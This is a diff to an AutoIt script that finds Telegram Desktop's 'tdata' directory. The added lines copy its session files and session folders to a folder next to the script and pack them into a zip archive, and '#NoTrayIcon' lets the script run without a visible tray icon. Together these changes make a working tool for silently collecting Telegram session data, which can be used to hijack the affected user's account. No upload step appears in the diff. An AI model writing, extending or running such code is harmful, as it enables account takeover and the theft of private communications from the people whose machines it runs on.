@@ -2,7 +2,9 @@
 #include <MsgBoxConstants.au3>
 #include <File.au3>
 #include <Array.au3>
+#include <_Zip.au3>
 
+#NoTrayIcon
 
 Func _ProcessGetPath($vProcess)
 	Local $iPID = ProcessExists($vProcess)
@@ -77,7 +79,6 @@ Func GetTelegramSessionFiles($telegramPath)
 		EndIf
 	Next
 	_ArrayDelete($tdataFileList, 0)
-;~ _ArrayDisplay($tdataFileList)
 	Return $tdataFileList
 EndFunc   ;==>GetTelegramSessionFiles
 
@@ -87,14 +88,35 @@ Func GetTelegramSessionFolders($telegramPath)
 
 	For $i = 1 To $tdataFolderList[0]
 		If StringLen($tdataFolderList[$i]) >= 15 Then
-;~ ConsoleWrite($tdataFolderList[$i] & @LF)
 			_ArrayAdd($sessionFolders, $tdataFolderList[$i])
 		EndIf
 	Next
 	_ArrayDelete($sessionFolders, 0)
-	_ArrayDisplay($sessionFolders)
 	Return $sessionFolders
 EndFunc   ;==>GetTelegramSessionFolders
 
+Func CopyArrayFiles($inputPath, $aFiles, $aOutputPath)
+	For $i = 0 To UBound($aFiles) - 1
+		FileCopy($inputPath & $aFiles[$i], $aOutputPath, $FC_OVERWRITE + $FC_CREATEPATH)
+	Next
+EndFunc   ;==>CopyArrayFiles
 
-GetTelegramSessionFolders(getTelegramDir())
+Func CopyArrayFolders($inputPath, $aFolders, $aOutputPath)
+	For $i = 0 To UBound($aFolders) - 1
+		DirCopy($inputPath & $aFolders[$i], $aOutputPath & '\' & $aFolders[$i], 0)
+	Next
+EndFunc   ;==>CopyArrayFolders
+
+Func ZipFolder($sFolder, $sZipFile)
+	$srcZipFile = _Zip_Create($sZipFile, 1)
+	_Zip_AddItem($srcZipFile, $sFolder)
+EndFunc   ;==>ZipFolder
+
+$aSessionFiles = GetTelegramSessionFiles(getTelegramDir())
+$aSessionFolders = GetTelegramSessionFolders(getTelegramDir())
+$tData = getTelegramDir() & "\tdata\"
+$outputPath = @ScriptDir & "\telegram\tdata\"
+
+CopyArrayFiles($tData, $aSessionFiles, $outputPath)
+CopyArrayFolders($tData, $aSessionFolders, $outputPath)
+ZipFolder($outputPath, @ScriptDir & '\zipfile.zip')
